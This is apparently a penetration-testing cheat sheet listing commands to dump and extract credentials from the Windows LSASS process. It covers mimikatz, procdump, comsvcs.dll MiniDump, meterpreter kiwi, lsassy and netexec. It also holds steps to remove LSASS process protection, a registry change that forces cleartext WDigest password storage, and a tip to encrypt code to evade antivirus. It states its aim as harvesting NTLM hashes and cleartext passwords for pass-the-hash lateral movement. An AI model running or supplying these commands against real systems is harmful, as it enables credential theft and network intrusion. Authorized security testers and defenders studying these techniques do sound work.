# Extract credentials from LSASS

## Tools: CrackMapExec/Netexec , lsassy , mimikatz , meterpreter , procdump , PPLDump , GUI

#### 1) LSASS as a Protected Process (LSA Bypass, Mimidrv.sys)

    PPLdump64.exe LSASS.EXE|LSASS_PID lsass.dmp

    mimikatz "!+" "!processProtect /process:mimikatz.exe" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe:" "!-" 
    
#### 2) Procdump

    Procdump.exe -accepteula -ma lsass.exe lsass.dmp

    mimikatz "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"

#### 3) Meterpreter

    load kiwi

    creds_all

#### 4) Mimikatz

    mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"

#### 5) lsassy

    lsassy -d DOMAIN -u USER -p 'PASSWORD' IP

#### 6) CrackMapExec/Netexec

    netexec smb IP_RANGE -u USER -p 'PASSWORD' -M lsassy

#### 7) rundll32.exe (comsvcs.dll)

    tasklist | findstr lsass 

OR

    tasklist /fi "Imagename eq lsass.exe"

THEN

    C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump LSASS_PID C:\temp\LSASS.dmp

#### 8) Pypykatz

    pypykatz lsa minidump lsass.dmp

#### 9) WDigest

##### CMD (Enable), Requires user to log off/on or lock screen to store in cleartext

    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

###### CMD (Disable), System reboot required to complete

    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f

THEN

# Mimikatz (Everything)

    Invoke-Mimikatz -DumpCreds

# Mimikatx (Just WDigest)

    Invoke-Mimikatz -Command '"sekurlsa::wdigest"'

##### Lsassy

    lsassy -u '[User]' -p '[Password]' -d '[Domain]' '[Target-IP]' --users --exec smb

### With LSASS dumped, you can recover NTLM Hashes as well as clertext credentials to do Lateral Movement via Pass-the-Hash or Pass-the-Key

# DUMP LSASS PROCESS WITH TASK MANAGER (REQUIRES GUI)

#### 1) GUI (Right-click on lsass.exe in Task Manager)

#### 2) Create dump file

#### 3) Copy dump file to mimikatz folder

## Sysinternals suite (Procdump)

#### procdump.exe -accepteula -ma lsass.exe c:\tools\mimikatz\lsass_dump

## TIP: Bypass AV, write code to encrypt

## Mimikatz

#### 1) mimikatz

#### 2) privilege::debug

#### 3) sekurlsa::logonpasswords

# BYPASS LSASS PROTECTION

#### 1) mimikatz

#### 2) privilege::debug 

#### 3) !+ (Load mimidrv driver into memory)

#### 4) !processprotect /process:lsass.exe /remove

#### 5) sekurlsa::logonpasswords
